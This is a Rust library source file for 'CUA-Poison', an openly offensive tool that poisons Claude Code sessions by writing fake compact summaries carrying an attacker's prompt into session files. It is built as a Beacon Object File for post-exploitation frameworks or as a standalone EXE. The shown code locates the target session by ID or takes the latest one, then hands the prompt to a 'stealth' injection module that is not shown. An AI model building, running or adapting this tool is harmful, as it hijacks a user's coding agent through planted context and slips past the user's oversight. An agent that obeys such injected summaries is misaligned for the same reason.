//! CUA-Poison: Claude Code Session Poisoning
//!
//! Poisons Claude Code sessions by injecting fake compact summaries into session files.
//! Supports both BOF (Beacon Object File) and standalone EXE modes.

// For BOF builds, use no_std with alloc
#![cfg_attr(feature = "bof", no_std)]
#![cfg_attr(feature = "bof", no_main)]
#![allow(clippy::missing_safety_doc)]
#![allow(clippy::must_use_candidate)]
#![allow(clippy::uninlined_format_args)]

// For BOF builds, use the no_std bof module
#[cfg(feature = "bof")]
extern crate alloc;

#[cfg(feature = "bof")]
extern crate cua_bof_common;

#[cfg(feature = "bof")]
mod bof;

#[cfg(feature = "bof")]
pub use bof::{entry, go};

// Use shared allocator from cua-bof-common
#[cfg(feature = "bof")]
#[global_allocator]
static ALLOCATOR: cua_bof_common::BofAllocator = cua_bof_common::BofAllocator;

// Panic handler for no_std BOF builds
#[cfg(feature = "bof")]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

// For EXE builds, use the full std implementation
#[cfg(not(feature = "bof"))]
pub mod platform;
#[cfg(not(feature = "bof"))]
pub mod sessions;
#[cfg(not(feature = "bof"))]
pub mod stealth;

#[cfg(not(feature = "bof"))]
use serde::{Deserialize, Serialize};

/// Result from poisoning operation
#[cfg(not(feature = "bof"))]
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PoisonResult {
    pub success: bool,
    pub session_id: String,
    pub message: String,
}

#[cfg(not(feature = "bof"))]
impl PoisonResult {
    pub fn success(session_id: String) -> Self {
        Self {
            success: true,
            session_id,
            message: "Session poisoned".to_string(),
        }
    }

    pub fn error(message: String) -> Self {
        Self {
            success: false,
            session_id: String::new(),
            message,
        }
    }
}

/// Session information
#[cfg(not(feature = "bof"))]
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionInfo {
    pub id: String,
    pub timestamp: Option<String>,
    pub project: Option<String>,
}

/// Main poisoning entry point
#[cfg(not(feature = "bof"))]
pub fn run_poison(prompt: &str, session_id: Option<&str>) -> PoisonResult {
    // Get session info - need both ID and project directory
    let (sid, project_dir) = match session_id {
        Some(s) if !s.is_empty() => {
            // Try to match partial session ID against full list
            let all_sessions = sessions::list_sessions(None);

            // First try exact match
            if let Some(sess) = all_sessions.iter().find(|sess| sess.id == s) {
                (sess.id.clone(), sess.project.clone())
            } else {
                // Try prefix match
                let matches: Vec<_> = all_sessions
                    .iter()
                    .filter(|sess| sess.id.starts_with(s))
                    .collect();

                match matches.len() {
                    0 => {
                        return PoisonResult::error(format!(
                            "No session found matching '{}'. Use 'cua-poison list' to see available sessions.",
                            s
                        ));
                    }
                    1 => (matches[0].id.clone(), matches[0].project.clone()),
                    _ => {
                        return PoisonResult::error(format!(
                            "Ambiguous session ID '{}' matches {} sessions. Please provide more characters.",
                            s,
                            matches.len()
                        ));
                    }
                }
            }
        }
        _ => {
            // Try to get latest session
            match sessions::get_latest_session(None) {
                Some(info) => (info.id, info.project),
                None => {
                    return PoisonResult::error(
                        "No Claude Code sessions found. Use Claude Code first to create a session."
                            .to_string(),
                    );
                }
            }
        }
    };

    // Get session file path
    let Some(session_file) = sessions::claude::get_session_file_path(&sid, None) else {
        return PoisonResult::error(format!("Session file not found for '{sid}'"));
    };

    // Get working directory (project directory or current directory)
    let cwd = project_dir
        .or_else(|| {
            std::env::current_dir()
                .ok()
                .and_then(|p| p.to_str().map(String::from))
        })
        .unwrap_or_else(|| ".".to_string());

    stealth::execute_stealth_injection(prompt, &session_file, &sid, &cwd)
}

/// List available Claude Code sessions
#[cfg(not(feature = "bof"))]
pub fn list_sessions(user: Option<&str>) -> Vec<SessionInfo> {
    sessions::list_sessions(user)
}
